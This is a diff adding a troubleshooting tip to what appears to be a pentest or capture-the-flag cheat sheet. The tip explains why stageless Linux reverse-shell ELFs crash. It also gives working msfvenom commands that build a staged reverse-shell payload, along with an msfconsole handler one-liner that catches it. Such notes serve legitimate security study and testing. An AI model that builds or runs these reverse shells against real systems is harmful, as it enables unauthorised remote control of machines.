@@ -66,6 +66,15 @@ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=IP LPO
 
 Swap `x64` → `x86` (and `-a x64` → `-a x86`) for 32-bit targets; if unsure on Windows, the `x86` payload runs on both. More in [Metasploit](../Tools/Metasploit.md) (`multi/handler`).
 
+> **ELF crashes on the target with `Segmentation fault (core dumped)`?** That's the **stageless** x64 ELF being fragile on modern Linux (glibc/kernel hardening) — not your setup. Two fixes, best first:
+> - **On Linux, use a native one-liner instead.** The [bash / python reverse shells](#reverse-shell-one-liners) below are far more reliable than any msfvenom ELF and need no dropped file — this is the standard choice for a Linux target. The msfvenom route is mainly for Windows, or when you specifically need a file to upload-and-run.
+> - **Need a dropped file?** Switch the stageless payload for the **staged** one and catch it with `multi/handler` (not `nc`) — the small stager execs cleanly where the stageless blob crashes:
+>   ```bash
+>   msfvenom -p linux/x64/shell/reverse_tcp -a x64 --platform linux LHOST=IP LPORT=PORT -f elf -o shell.elf
+>   msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST IP; set LPORT PORT; run"
+>   ```
+>   Note `shell/reverse_tcp` (staged, needs the handler) vs `shell_reverse_tcp` (stageless, nc-catchable) — the `_` vs `/` is the whole difference. `linux/x64/meterpreter/reverse_tcp` is an equally robust staged option. Don't reach for encoders here — they rarely help Linux ELFs and often make the crash worse.
+
 ## Reverse shell one-liners
 
 Set `IP` and `PORT` to your listener. Run **one** of these on the target.
